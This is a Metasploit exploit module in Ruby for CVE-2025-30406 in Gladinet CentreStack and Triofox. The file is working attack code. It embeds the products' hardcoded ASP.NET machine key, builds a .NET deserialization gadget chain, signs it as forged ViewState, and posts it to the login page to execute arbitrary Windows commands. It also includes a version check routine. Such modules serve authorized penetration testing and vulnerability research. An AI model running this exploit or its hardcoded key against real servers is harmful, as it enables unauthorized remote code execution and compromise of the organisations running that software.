# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

require 'rex/exploit/view_state'

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  # base64 encoded machine key
  MACHINE_KEY = 'NTQ5NjgzMjI0MkNDMzIyOEUyOTJFRUZGQ0RBMDg5MTQ5RDc4OUUwQzREN0MxQTVEMDJCQzU0MkY3QzYyNzlCRTlERDc3MEM5RURENUQ2N0M2NkI3RTYyMTQxMUQzRTU3RUExODFCQkY4OUZEMjE5NTdEQ0RERkFDRkQ5MjZFMTY='.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gladinet CentreStack/Triofox ASP.NET ViewState Deserialization',
        'Description' => %q{
          A vulnerability in Gladinet CentreStack and Triofox application using hardcoded
          cryptographic keys for ViewState could allow an attacker to forge ViewState data.
          This can lead to unauthorized actions such as remote code execution.
          Both applications make use of a hardcoded machineKey in the IIS web.config file,
          which is responsible for securing ASP.NET ViewState data. If an attacker obtains
          the machineKey, they can forge ViewState payloads that pass integrity checks.
          This can result in ViewState deserialization attacks, potentially leading to
          remote code execution (RCE) on the web server.

          Gladinet CentreStack versions up to 16.4.10315.56368 are vulnerable (fixed in 16.4.10315.56368).
          Gladinet Triofox versions up to 16.4.10317.56372 are vulnerable (fixed in 16.4.10317.56372).
          NOTE: There are other rebranded services that might be vulnerable and can be detected by this module.
        },
        'Author' => [
          'Huntress Team', # discovery and detailed vulnerability write up
          'H00die Gr3y' # this metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-30406'],
          ['URL', 'https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild'],
          ['URL', 'https://attackerkb.com/topics/7ebXn71J6O/cve-2025-30406']
        ],
        'Platform' => 'win',
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :windows_command
            }
          ]
        ],
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-04-03',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
        'Privileged' => false
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The base path to the Gladinet CentreStack or Triofox application', '/' ])
    ])
  end

  def execute_command(cmd, _opts = {})
    # get the __VIEWSTATEGENERATOR value from the vulnerable page
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'portal', 'loginpage.aspx')
    })
    unless res&.code == 200
      fail_with(Failure::UnexpectedReply, 'Non-200 HTTP response received while trying to get the __VIEWSTATEGENERATOR value.')
    end

    html = res.get_html_document
    if html
      # html identifier for the __VIEWSTATEGENERATOR: <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="3FE2630A" />
      generator = html.css('input#__VIEWSTATEGENERATOR')[0]['value']
      viewstate_generator = [generator.to_i(16)].pack('V') unless generator.nil?
    else
      viewstate_generator = ['3FE2630A'.to_i(16)].pack('V')
    end

    output_format = 'raw'
    viewstate_validation_algorithm = 'SHA256'
    viewstate_validation_key = [Base64.strict_decode64(MACHINE_KEY)].pack('H*')

    serialized = ::Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :LosFormatter
    )

    serialized = Rex::Exploit::ViewState.generate_viewstate(
      serialized,
      extra: viewstate_generator,
      algo: viewstate_validation_algorithm,
      key: viewstate_validation_key
    )
    transformed = ::Msf::Simple::Buffer.transform(serialized, output_format)
    vprint_status(transformed.to_s)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'portal', 'loginpage.aspx'),
      'vars_post' => {
        '__LASTFOCUS' => '',
        '__VIEWSTATE' => transformed.to_s
      }
    })
    unless res&.code == 302
      fail_with(Failure::UnexpectedReply, 'Non-302 HTTP response received while trying to execute the payload.')
    end
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'portal', 'loginpage.aspx')
    })
    return CheckCode::Safe('Failed to identify that Gladinet CentreStack/Triofox or similar service is running.') unless res&.code == 200 && res.body.include?('id="__VIEWSTATEGENERATOR" value="3FE2630A"')

    if res.body.include?('CentreStack')
      check_app = 'CentreStack'
    elsif res.body.include?('Triofox')
      check_app = 'Triofox'
    else
      check_app = 'Unknown'
    end

    build = res.body.match(/\(Build\s*.*\)/)
    unless build.nil?
      version = build[0].gsub(/[[:space:]]/, '').split('Build')[1].chomp(')')
      rex_version = Rex::Version.new(version)
      if check_app == 'CentreStack'
        return CheckCode::Appears("Service #{check_app} (Build #{version})") if rex_version < Rex::Version.new('16.4.10315.56368')
      elsif check_app == 'Triofox'
        return CheckCode::Appears("Service #{check_app} (Build #{version})") if rex_version < Rex::Version.new('16.4.10317.56372')
      elsif check_app == 'Unknown'
        return CheckCode::Detected("Service #{check_app} (Build #{version})") if rex_version < Rex::Version.new('16.4.10317.56372')
      end
      return CheckCode::Safe("Service #{check_app} (Build #{version})")
    end

    CheckCode::Detected("Service #{check_app} (Build not detected)")
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    execute_command(payload.encoded)
  end
end
